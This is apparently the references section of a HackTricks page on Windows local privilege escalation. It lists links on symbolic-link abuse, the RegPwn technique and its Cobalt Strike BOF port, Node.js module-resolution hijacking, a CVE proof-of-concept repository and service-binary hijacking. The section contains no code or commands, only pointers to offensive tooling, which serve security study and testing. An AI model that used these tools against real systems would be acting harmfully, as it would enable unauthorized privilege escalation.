- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
